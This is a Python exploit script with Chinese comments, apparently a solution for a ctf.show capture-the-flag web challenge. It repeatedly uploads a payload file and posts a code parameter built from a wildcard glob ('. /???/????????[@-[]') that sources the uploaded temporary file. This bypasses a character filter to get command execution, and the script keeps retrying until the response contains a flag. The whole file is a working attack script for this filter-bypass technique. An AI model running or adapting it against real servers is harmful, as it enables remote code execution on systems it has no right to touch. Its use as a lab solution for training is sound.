import requests
import time
import sys

# ==================== 配置区域 ====================
# 请将这里的 URL 替换为你的目标靶场地址
TARGET_URL = "http://3dbe151c-75c7-46fd-a0ec-1b5faf9a6231.challenge.ctf.show/"
# payload.txt 文件需要放在与脚本相同的目录下
PAYLOAD_FILE_PATH = "payload.txt"
# 用于判断成功的标志字符串
CHECK_FLAG_STR = "CTF{"
# 脚本运行的总超时时间（秒）
TIMEOUT_SECONDS = 300
# ================================================

start_time = time.time()

try:
    with open(PAYLOAD_FILE_PATH, "r", encoding="utf-8") as f:
        # 构造上传的文件
        file = {"file": f}
        # 需要提交的代码参数
        data = {"code": ". /???/????????[@-[]"}

        print(f"[*] 开始向 {TARGET_URL} 发送请求...")

        while time.time() - start_time < TIMEOUT_SECONDS:
            try:
                # 发送 POST 请求
                response = requests.post(
                    TARGET_URL,
                    files=file,
                    data=data,
                    timeout=10,
                    allow_redirects=False
                )

                # 检查响应中是否包含 Flag 标志
                if CHECK_FLAG_STR in response.text:
                    # 提取完整的 Flag
                    start_idx = response.text.find(CHECK_FLAG_STR)
                    end_idx = response.text.find("}", start_idx) + 1
                    flag = response.text[start_idx:end_idx] if end_idx > start_idx else response.text[start_idx:]
                    print(f"[+] 成功找到 Flag：{flag}")
                    sys.exit(0)
                else:
                    print(f"[*] 未找到 flag，1秒后重试...")
                    time.sleep(1)

            except Exception as e:
                print(f"[!] 请求失败：{e}，1秒后重试...")
                time.sleep(1)

except FileNotFoundError:
    print(f"[!] 错误：在当前目录下找不到文件 {PAYLOAD_FILE_PATH}")
    sys.exit(1)
except Exception as e:
    print(f"[!] 发生未预期的错误：{e}")
    sys.exit(1)

print(f"[-] 超时：{TIMEOUT_SECONDS}秒内未找到 flag")
sys.exit(1)
